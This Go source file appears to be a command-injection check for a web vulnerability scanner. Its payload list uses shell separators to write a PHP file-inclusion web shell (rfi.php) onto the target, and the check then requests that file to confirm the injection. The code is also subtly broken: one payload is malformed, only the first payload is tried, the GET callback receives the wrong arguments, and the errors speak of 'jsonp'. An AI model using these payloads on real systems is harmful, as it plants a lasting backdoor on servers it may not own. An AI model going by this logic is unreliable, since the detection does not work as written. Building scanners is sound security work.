package cmdinject

import (
	"errors"
	"fmt"
	"glint/fastreq"
	"glint/logger"
	"glint/plugin"
	"glint/util"
	"net/http"
	"strings"

	"github.com/valyala/fasthttp"
)

// const (
// 	phpinject = "phpinjectds"
// )

var cert string
var mkey string

type CallbackCheck func(args ...interface{}) (bool, error)

var DefaultProxy = ""

var payload_page = []string{
	`| echo "<?php include($_GET['page'])| ?>" > rfi.php`,
	`; echo "<?php include($_GET['page']); ?>" > rfi.php`,
	`& echo "<?php include($_GET['page']); ?>" > rfi.php`,
	`&& echo "<?php include($_GET['page']); ?>" > rfi.php`,
}

func cmd1(args ...interface{}) (bool, error) {
	var url string
	for _, arg := range args {
		if value, ok := arg.(string); ok {
			url = value
		}
	}
	resp, err := http.DefaultClient.Get(url + "/" + "rfi.php")
	if err != nil {
		return false, errors.New("not found cmd1 inject")
	}
	if resp.StatusCode == 200 {
		return true, nil
	}
	return false, errors.New("not found cmd1 inject")
}

func fast_send_poc(payloads []string,
	url string,
	headers map[string]string,
	method string,
	ContentType string,
	callback CallbackCheck,
) (
	req1 *fasthttp.Request,
	resp1 *fastreq.Response,
	err error) {
	sess := fastreq.GetSessionByOptions(
		&fastreq.ReqOptions{
			Timeout:       2,
			AllowRedirect: true,
			Proxy:         DefaultProxy,
			Cert:          cert,
			PrivateKey:    mkey,
		})
	if strings.ToUpper(method) == "POST" {
		for _, body := range payloads {
			req1, resp1, errs := sess.Post(url, headers, []byte(body))
			if errs != nil {
				continue
				// return nil, nil, errs
			}
			b, err := callback(url)
			if b {
				return req1, resp1, err
			}
		}
	} else {
		for _, payload_url := range payloads {
			req1, resp1, errs := sess.Get(payload_url, headers)
			if errs != nil {
				continue
			}
			b, err := callback(req1, resp1)
			if b {
				return req1, resp1, err
			}
		}
	}
	return nil, nil, errors.New("not found cmd1 inject")
}

// 检测是否执行echo "xxxx" > rfi.php 此命令
func cmd_mkdir(url string, method string, headers map[string]string, body []byte, ContentType string) (*fasthttp.Request,
	*fastreq.Response, error) {
	params, err := util.ParseUri(url, body, method, ContentType)
	if err != nil {
		logger.Error(err.Error())
		return nil, nil, fmt.Errorf(err.Error())
	}
	for _, payload := range payload_page {
		payloads := params.SetPayload(url, payload, method)
		req, resp, err := fast_send_poc(payloads, url, headers, method, ContentType, cmd1)
		if err != nil {
			return req, resp, nil
		} else {
			return req, resp, err
		}
	}
	return nil, nil, errors.New("not found cmd1 inject")
}

func CmdValid(args interface{}) (*util.ScanResult, error) {
	group := args.(plugin.GroupData)
	// ORIGIN_URL := `http://not-a-valid-origin.xsrfprobe-csrftesting.0xinfection.xyz`
	ctx := *group.Pctx

	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	default:
	}

	var ContentType string
	session := group.GroupUrls.(map[string]interface{})
	url := session["url"].(string)
	method := session["method"].(string)
	headers, _ := util.ConvertHeaders(session["headers"].(map[string]interface{}))
	if value, ok := headers["Content-Type"]; ok {
		ContentType = value
	}
	body := []byte(session["data"].(string))
	cert = session["cert"].(string)
	mkey = session["key"].(string)

	req, resp, err := cmd_mkdir(url, method, headers, body, ContentType)
	if err != nil {
		return nil, fmt.Errorf("check jsonp error: %v", err)
	}
	if req != nil && resp != nil {
		Result := util.VulnerableTcpOrUdpResult(url,
			"cmd inject vulnerability found",
			[]string{string(req.String())},
			[]string{string(resp.String())},
			"high",
			session["hostid"].(int64))

		return Result, err
	}
	return nil, errors.New("jsonp vulnerability not found")
}
